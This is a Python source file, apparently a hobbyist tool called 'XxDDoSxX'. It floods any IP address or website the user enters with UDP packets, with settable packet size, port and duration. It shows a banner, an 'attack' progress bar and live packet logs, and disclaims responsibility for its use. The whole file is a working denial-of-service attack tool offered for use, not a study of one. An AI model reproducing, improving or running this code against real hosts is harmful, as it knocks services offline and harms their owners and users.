import socket, os , datetime, sys, threading, select, time as t


# Setup de print couleur
def printRed(text):
 print("\033[91m{}\033[00m".format(text))

def printGreen(text):
 print("\033[92m{}\033[00m".format(text))

def printYellow(text):
 print("\033[93m{}\033[00m".format(text))

def printInfos(text, text1):
 print("\033[92m{}\033[00m".format(text), "\033[94m{}\033[00m".format(text1))
 
def inputYellow(text):
 value = input("\033[93m{}\033[00m".format(text))
 return value
 
def printPurple(text):
 print("\033[95m{}\033[00m".format(text), end="")
 
def printLightPurple(text):
 print("\033[94m{}\033[00m".format(text))

def printCyan(text):
 print("\033[96m{}\033[00m".format(text))

# Setup de clear + bannière
def style():
	os.system("clear")
	printCyan("===========================================================================")
	printRed("               __   __    ____________      _____     __   __")
	printRed("               \ \ / /    |  _  \  _  \    /  ___|    \ \ / /")
	printRed("                \ V /__  _| | | | | | |___ \ `--.__  __\ V / ")
	printRed("                /   \  \/ | | | | | / _ \ `--. \ \\ \/  /   \ ")
	printRed("               / /^\ \>  <| |/ /| |/ / (_) /\__/ />  </ /^\ \\")
	printRed("               \/   \/_/\_\___/ |___/ \___/\____//_/\_\/   \/")
	printCyan("===========================================================================")
	printLightPurple("                           //XxDDoSxX by C0C0\\\\") 
	printCyan("===========================================================================")

# Fonction de bienvenue
def welcome():
	style()
	printRed("\n                                 Welcome !\n                         Press 'Enter' for continue\n")
	printLightPurple("[Infos :]\n")
	printPurple("  [+]")
	printInfos(" Github :","https://github.com/XxC0C0xX")
	printPurple("  [+]")
	printInfos(" XxDDoSxX version :","1.5.6")
	printPurple("  [+]")
	printInfos(" Latest update :", "10/12/2023")
	printPurple("  [+]")
	printInfos(" Python version :", "3.11.6")
	printPurple("  [+]")
	printInfos(" Exit XxDDoSxX :", "Press 'CRTL + C'")
	printPurple("  [+]")
	printRed(" I am not responsible for your actions\n\n")
	printLightPurple("[Steps :]\n")
	printPurple("  [1]")
	printYellow(" IP or WebSite Adress")
	printPurple("  [1*]")
	printYellow(" After relaunch conserve IP Adress")
	printPurple("  [2]")
	printYellow(" Bytes send")
	printPurple("  [3]")
	printYellow(" Port")
	printPurple("  [4]")
	printYellow(" Time in minutes")
	printPurple("  [*]")
	printYellow(" Relaunch\n\n")

# Fonction pour le chargement
def loading():
	style()
	printRed("                             Starting attack")
	printGreen("                           ____________________")
	printGreen("                          |          0%        |")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	t.sleep(1)
	style()
	printRed("                             Starting attack.")
	printGreen("                           ____________________")
	printGreen("                          |==       10%        |")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	t.sleep(1.2)
	style()
	printRed("                             Starting attack..")
	printGreen("                           ____________________")
	printGreen("                          |=====    25%        |")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	t.sleep(1.1)
	style()
	printRed("                             Starting attack...")
	printGreen("                           ____________________")
	printGreen("                          |======== 40%        |")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	style()
	printRed("                             Starting attack")
	printGreen("                           ____________________")
	printGreen("                          |=========55%        |")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	t.sleep(1)
	style()
	printRed("                             Starting attack.")
	printGreen("                           ____________________")
	printGreen("                          |=========70%=       |")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	t.sleep(1.3)
	style()
	printRed("                             Starting attack..")
	printGreen("                           ____________________")
	printGreen("                          |=========85%====    |")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	t.sleep(1.4)
	style()
	printRed("                             Starting attack...")
	printGreen("                           ____________________")
	printGreen("                          |=========100%=======|")
	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
	t.sleep(1.2)


# Setup de now (Heure actuelle en secondes)
def now():
	now = datetime.datetime.now()
	now = str(now)
	nowSecond = int(now[11:13])*3600 + int(now[14:16])*60 + int(now[17:19])
	return nowSecond   


# Définition des variables, pre setup du ddos
relaunch = "0"
ipSave = "0"
startDDoS = False
	                     

# Programme principal
# Écran de bienvenue
try:
	welcome()
	infos = input()
except KeyboardInterrupt:
	style()
	printRed("\n                                   Bye !")
	t.sleep(2)
	os.system("clear")
	sys.exit()


def ddos():


	# Définition des variables globals pour les logs total
	global logsTotalHours, logsTotal, hoursPrintTotal, minutePrintTotal, secondsPrintTotal, ipSave, bytes, port, packetPerSecondTotal
	

	# Vérifie l'adresse ip
	global relaunch, ipSave
	style()
	printGreen("\n                     Infos : Works best with local IP")
	if relaunch == "y" or relaunch == "Y" or relaunch == "yes" or relaunch == "Yes":
		printGreen("                      Press 'Enter' for conserve IP")
	printPurple("\n[1]")
	ipSend = inputYellow(" IP or WebSite Adress : ")
	while True:
		if relaunch == "y" and ipSend == "" or relaunch == "Y" and ipSend == "" or relaunch == "yes" and ipSend == "" or relaunch == "Yes" and ipSend == "":
			try:
				ip = socket.gethostbyname(ipSave)
				break
			except:
				pass
		if ipSend != "":
			if ipSend[0:8] == "https://":
				ipSend = ipSend[8:len(ipSend)]
	
			elif ipSend[0:7] == "http://":
				ipSend = ipSend[7:len(ipSend)]
	
			for i in range(len(ipSend)):
				if ipSend[i]=="/":
					ipSend = ipSend[0:i]
					break
			try:
				ipSave = ipSend
				ip = socket.gethostbyname(ipSend)
				break
			except:
				pass
		style()
		printGreen("\n                     Infos : Works best with local IP")
		printRed("                      Error : IP Adress is not found")
		printPurple("\n[1]")
		ipSend = inputYellow(" IP or WebSite Adress : ")

	# Vérifie que bytes est dans [1 ;65507]
	style()
	printGreen("\n                           Infos : Default 250")
	printPurple("\n[2]")
	bytes = inputYellow(" Bytes send (int, Min : 1, Max : 65507) : ")
	while True:
		if bytes == "":
			bytes = 250
		try:
			bytes = int(bytes)
			if bytes >= 1 and bytes <= 65507:
				break
		except ValueError:
				pass
		style()
		printGreen("\n                           Infos : Default 250")
		printRed("                  Error : Number of Bytes is not interval")
		printPurple("\n[2]")
		bytes = inputYellow(" Bytes send (int, Min : 1, Max : 65507) : ")
	
	# Vérifie que port est dans [1 ;65534]
	style()
	printGreen("\n                            Infos : Default 80")
	printPurple("\n[3]")
	port = inputYellow(" Port (int, Min : 1, Max : 65534) : ")
	while True:
		if port == "":
			port = 80
		try:
			port = int(port)
			if bytes >= 1 and bytes <= 65534:
				break
		except ValueError:
				pass
		style()
		printGreen("\n                            Infos : Default 80")
		printRed("                  Error : Number of Port is not interval")
		printPurple("\n[3]")
		port = inputYellow(" Port (int, Min : 1, Max : 65534) : ")

	# Vérifie que time est dans [1 ;1439]
	style()	
	global time
	printGreen("\n                            Infos : Default 10")
	printPurple("\n[4]")
	time = inputYellow(" Time in Minutes (int, Min : 1, Max : 1439) : ")
	while True:
		if time == "":
			time = 10
		try:
			time = int(time)
			if time >= 1 and time <= 1439:
				time *= 60
				break
		except ValueError:
				pass
		style()
		printGreen("\n                            Infos : Default 10")
		printRed("                  Error : Number of Time is not interval")
		printPurple("\n[4]")
		time = inputYellow(" Time in Minutes (int, Min : 1, Max : 1439) : ")
		

	# Fonction pour lire la console sans interrompre
	def inputNoInterrupted():
		global exit, time, timeLocal
		timeLocal = time
		input, e, o = select.select([sys.stdin], [], [], int(timeLocal))

		if input:
			while timeLocal != 0:
				input = sys.stdin.readline().strip()
				if input == "":
					exit = ""
					return exit
			return 0

	# Définition de thread
	global thread
	thread = threading.Thread(target=inputNoInterrupted)


	# Chargement
	loading()
	
	
	# Setup du ddos
	# Message avec nombre de bytes
	send = "0"*bytes

	# Création d'un paquet UDP
	sock = socket.socket(socket.AF_INET, 	socket.SOCK_DGRAM)

	# Heure de fin (en secondes)
	nowSecond = time + now()
	nowSecondPrint = nowSecond
	nowSecond -= 86400 if nowSecond >= 86400 else 0

	# Variable à 0
	packetPerSecond = 0
	packetPerSecondTotal = 0
	timeEnd = 0
	sendTime = now()

	# Début du thread
	thread.start()

	
	# Coeur du DDoS
	while True:

		global startDDoS
		startDDoS = True
		
		# Mise a jour de requete par secondes
		packetPerSecond += 1
		
		# Conversion du temps restant en hh:mm:ss
		(hoursPrint, secondsPrint) = divmod(nowSecondPrint - now(), 3600)
		(minutePrint, secondsPrint) = divmod(secondsPrint, 60)
		hoursPrint = "0" + str(hoursPrint) if hoursPrint < 10 else hoursPrint
		minutePrint = "0" + str(minutePrint) if minutePrint < 10 else minutePrint
		secondsPrint = "0" + str(secondsPrint) if secondsPrint < 10 else secondsPrint

		# Conversion du temps d'attaque total en hh:mm:ss
		(hoursPrintTotal, secondsPrintTotal) = divmod(timeEnd, 3600)
		(minutePrintTotal, secondsPrintTotal) = divmod(secondsPrintTotal, 60)
		hoursPrintTotal = "0" + str(hoursPrintTotal) if hoursPrintTotal < 10 else hoursPrintTotal
		minutePrintTotal = "0" + str(minutePrintTotal) if minutePrintTotal < 10 else minutePrintTotal
		secondsPrintTotal = "0" + str(secondsPrintTotal) if secondsPrintTotal < 10 else secondsPrintTotal
		
		# Envoi du paquet
		sock.sendto(send.encode(), (ip, port))
		
		# Affichage des logs toutes les secondes
		if sendTime != now():
			style()
			printRed("\n                      Press 'Enter' for stop attack")
			logsHours = "\n["+str(hoursPrint)+":"+str(minutePrint)+":"+str(secondsPrint)+"]"
			logs = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(packetPerSecond)
			printPurple(logsHours)
			printGreen(logs)
			packetPerSecondTotal += packetPerSecond
			packetPerSecond = 0
			sendTime = now()
			timeEnd += 1
			
		# Fin de l'attaque avec options pour relancer
		global exit
		if nowSecond == now() or exit == "":

			# Fin du thread
			thread.join()
			
			exit = "0"
			startDDoS = False

			# Affichage des logs total
			style()
			printRed("\n                                 Finish !\n                               Total logs : ")
			logsTotalHours = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"]"
			logsTotal = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(packetPerSecondTotal)
			printPurple(logsTotalHours)
			printGreen(logsTotal)
			printPurple("\n[*]")

			# Relancer
			relaunch = inputYellow(" Relaunch ? (y/n) : ")
			while True:
				if relaunch == "y" or relaunch == "Y" or relaunch == "yes" or relaunch == "Yes":
					sock.close()
					return 0
				if relaunch == "n" or relaunch == "N" or relaunch == "no" or relaunch == "No":
					style()
					printRed("\n                                   Bye !")
					t.sleep(2)
					os.system("clear")
					sock.close()
					sys.exit()
				else:
					style()
					printRed("\n                            Error : Answer y/n")
					printPurple("\n[*]")
					relaunch = inputYellow(" Relaunch ? (y/n) : ")


# Démaragge du programme principal
try:
	ddos()
	while relaunch == "y" or relaunch == "Y" or relaunch == "yes" or relaunch == "Yes":
		ddos()
except KeyboardInterrupt:
	style()
	if startDDoS == True:
		timeLocal = 0
		thread.join()
		printRed("\n                                   Bye !\n                          Press 'Enter' for exit")
		logsTotalHours = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"]"
		logsTotal = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(packetPerSecondTotal)
		printPurple(logsTotalHours)
		printGreen(logsTotal)
		infos = input("\n\n")
		os.system("clear")
		sys.exit()
	else:
		printRed("\n                                   Bye !")
		t.sleep(2)
		os.system("clear")
		sys.exit()
